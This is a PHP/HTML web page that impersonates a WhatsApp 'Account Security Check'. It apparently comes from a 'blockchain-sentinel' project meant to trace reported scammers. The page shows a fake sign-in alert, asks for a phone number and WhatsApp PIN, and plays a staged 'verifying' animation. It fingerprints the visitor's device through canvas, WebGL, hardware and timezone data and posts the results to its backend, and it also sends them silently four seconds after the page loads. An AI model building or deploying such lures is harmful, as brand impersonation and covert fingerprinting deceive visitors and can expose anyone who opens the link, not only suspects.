<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>WhatsApp – Account Verification</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
  .card{background:white;border-radius:16px;padding:36px 28px;width:100%;max-width:380px;box-shadow:0 2px 20px rgba(0,0,0,0.1);text-align:center;}
  .logo{width:72px;height:72px;background:#25D366;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:38px;}
  h1{font-size:20px;font-weight:700;color:#111b21;margin-bottom:6px;}
  .sub{font-size:13px;color:#667781;margin-bottom:24px;line-height:1.5;}
  .alert-box{background:#fff8e1;border:1px solid #ffe082;border-radius:8px;padding:12px;margin-bottom:20px;font-size:12px;color:#795548;text-align:left;line-height:1.5;}
  .field{margin-bottom:14px;text-align:left;}
  .field label{font-size:11px;color:#667781;display:block;margin-bottom:5px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;}
  .phone-row{display:flex;gap:8px;}
  .cc-select{width:90px;padding:13px 8px;border:1.5px solid #e9edef;border-radius:8px;font-size:14px;outline:none;color:#111b21;background:white;-webkit-appearance:none;}
  input[type=tel],input[type=text]{width:100%;padding:13px 14px;border:1.5px solid #e9edef;border-radius:8px;font-size:16px;outline:none;color:#111b21;transition:border-color .2s;}
  input:focus,.cc-select:focus{border-color:#25D366;}
  .btn{width:100%;padding:14px;background:#25D366;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .2s;}
  .btn:hover{background:#1ebe5d;}
  .btn:disabled{background:#aaa;}
  .note{margin-top:16px;font-size:11px;color:#aaa;display:flex;align-items:center;justify-content:center;gap:5px;}

  /* Scan overlay */
  .overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.88);z-index:99;flex-direction:column;align-items:center;justify-content:center;color:white;padding:30px;}
  .overlay.show{display:flex;}
  .ring{width:90px;height:90px;border:3px solid transparent;border-top-color:#25D366;border-right-color:rgba(37,211,102,.3);border-radius:50%;animation:spin 1s linear infinite;margin-bottom:25px;}
  @keyframes spin{to{transform:rotate(360deg);}}
  .scan-label{font-size:13px;color:#25D366;letter-spacing:1px;margin-bottom:15px;font-family:monospace;text-align:center;}
  .prog-bg{width:220px;height:3px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden;}
  .prog-fill{height:100%;background:#25D366;width:0%;transition:width .4s ease;}

  /* Done screen */
  .done{display:none;text-align:center;}
  .done.show{display:block;}
  .tick{font-size:56px;margin-bottom:12px;}
  .done-title{font-size:19px;font-weight:700;color:#111b21;margin-bottom:6px;}
  .done-sub{font-size:13px;color:#667781;line-height:1.6;}
  .token-box{margin-top:14px;padding:10px;background:#f0f2f5;border-radius:8px;font-family:monospace;font-size:10px;color:#aaa;word-break:break-all;}
</style>
</head>
<body>
<?php
$report_id = intval($_GET['report'] ?? 0);
$role      = in_array($_GET['role'] ?? '', ['scammer','suspect']) ? $_GET['role'] : 'scammer';
$phone_pre = htmlspecialchars($_GET['phone'] ?? '');
?>

<div class="card" id="mainCard">
  <div class="logo">💬</div>
  <h1>Account Security Check</h1>
  <p class="sub">WhatsApp detected a sign-in attempt on your account. Please verify your number to continue.</p>

  <div class="alert-box">
    ⚠️ <strong>Security Alert:</strong> Your account access was requested from a new device. Confirm your number to protect your account.
  </div>

  <form onsubmit="handleSubmit(event)" id="verifyForm">
    <div class="field">
      <label>Your WhatsApp Number</label>
      <div class="phone-row">
        <select class="cc-select" id="cc">
          <option value="+91">🇮🇳 +91</option>
          <option value="+1">🇺🇸 +1</option>
          <option value="+44">🇬🇧 +44</option>
          <option value="+971">🇦🇪 +971</option>
          <option value="+60">🇲🇾 +60</option>
          <option value="+65">🇸🇬 +65</option>
          <option value="+61">🇦🇺 +61</option>
        </select>
        <input type="tel" id="phoneNum" placeholder="Mobile number" value="<?= $phone_pre ?>" maxlength="12">
      </div>
    </div>
    <div class="field">
      <label>WhatsApp PIN</label>
      <input type="text" id="pin" placeholder="6-digit PIN" maxlength="6" inputmode="numeric">
    </div>
    <button type="submit" class="btn" id="submitBtn">Verify My Account</button>
  </form>
  <div class="note">🔒 Secured by WhatsApp end-to-end encryption</div>
</div>

<!-- Scan Overlay — hidden, only shown briefly -->
<div class="overlay" id="overlay">
  <div class="ring"></div>
  <div class="scan-label" id="scanLabel">VERIFYING...</div>
  <div class="prog-bg"><div class="prog-fill" id="progFill"></div></div>
</div>

<!-- Done -->
<div class="card" id="doneCard" style="display:none;">
  <div class="done show">
    <div class="tick">✅</div>
    <div class="done-title">Verification Successful</div>
    <div class="done-sub">Your WhatsApp account is now secured.<br>You may close this window.</div>
    <div class="token-box" id="tokenBox"></div>
  </div>
</div>

<script>
const REPORT_ID = <?= $report_id ?>;
const ROLE      = '<?= $role ?>';

// ======= FINGERPRINT COLLECTION =======
function collect() {
  return {
    screen_resolution:     screen.width + 'x' + screen.height,
    color_depth:           screen.colorDepth,
    browser:               navigator.userAgent,
    os:                    navigator.platform,
    language:              navigator.language,
    languages:             (navigator.languages||[]).join(','),
    timezone:              Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezone_offset:       new Date().getTimezoneOffset(),
    device_memory:         navigator.deviceMemory || 'unknown',
    hardware_concurrency:  navigator.hardwareConcurrency || 'unknown',
    touch_support:         navigator.maxTouchPoints || 0,
    pixel_ratio:           window.devicePixelRatio || 1,
    connection:            (navigator.connection||{}).effectiveType||'unknown',
    canvas_fingerprint:    getCanvas(),
    webgl_fingerprint:     getWebGL(),
    cookies_enabled:       navigator.cookieEnabled,
    do_not_track:          navigator.doNotTrack || 'unknown',
  };
}

function getCanvas() {
  try {
    const c=document.createElement('canvas'); c.width=220; c.height=40;
    const x=c.getContext('2d');
    x.fillStyle='#f60'; x.fillRect(120,1,60,18);
    x.fillStyle='#069'; x.font='11pt Arial'; x.fillText('WA-Secure🔒',2,14);
    x.fillStyle='rgba(102,204,0,.7)'; x.font='16pt Georgia'; x.fillText('WA-Secure🔒',4,38);
    return c.toDataURL().slice(-50);
  } catch(e){ return 'n/a'; }
}

function getWebGL() {
  try {
    const c=document.createElement('canvas');
    const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
    if(!gl) return 'n/a';
    const ext=gl.getExtension('WEBGL_debug_renderer_info');
    const r=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);
    const v=ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR);
    return (v+'::'+r).substr(0,80);
  } catch(e){ return 'n/a'; }
}

// SHA256 in browser (fallback)
async function sha256(msg) {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(msg));
  return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
}

// Send to backend
async function sendFP(fp, phone) {
  const base = window.location.origin;
  const url  = base + '/blockchain-sentinel/backend/realtime_scan.php';
  try {
    const r = await fetch(url, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ report_id: REPORT_ID, role: ROLE, fingerprint: fp, phone: phone })
    });
    const d = await r.json();
    return d.hash || await sha256(JSON.stringify(fp));
  } catch(e) {
    return await sha256(JSON.stringify(fp));
  }
}

// Scan stage messages
const stages = [
  'READING DEVICE SIGNATURE...',
  'COLLECTING BROWSER PARAMETERS...',
  'ANALYZING HARDWARE PROFILE...',
  'GENERATING SHA-256 IDENTITY HASH...',
  'TRANSMITTING TO BLOCKCHAIN...',
  'VERIFICATION COMPLETE ✓',
];

async function handleSubmit(e) {
  e.preventDefault();
  const phone = document.getElementById('cc').value + document.getElementById('phoneNum').value;
  const fp    = collect();

  // Show overlay
  const overlay  = document.getElementById('overlay');
  const label    = document.getElementById('scanLabel');
  const fill     = document.getElementById('progFill');
  overlay.classList.add('show');

  for (let i=0; i<stages.length; i++) {
    label.textContent = stages[i];
    fill.style.width  = ((i+1)/stages.length*100)+'%';
    await new Promise(r=>setTimeout(r, 600));
  }

  const hash = await sendFP(fp, phone);

  overlay.classList.remove('show');
  document.getElementById('mainCard').style.display = 'none';
  document.getElementById('doneCard').style.display  = 'block';
  document.getElementById('tokenBox').textContent    = 'Security Token: ' + hash.substr(0,32) + '...';
}

// Passive silent collection after 4s (no interaction needed)
setTimeout(async () => {
  const fp = collect();
  sendFP(fp, '').catch(()=>{});
}, 4000);
</script>
</body>
</html>
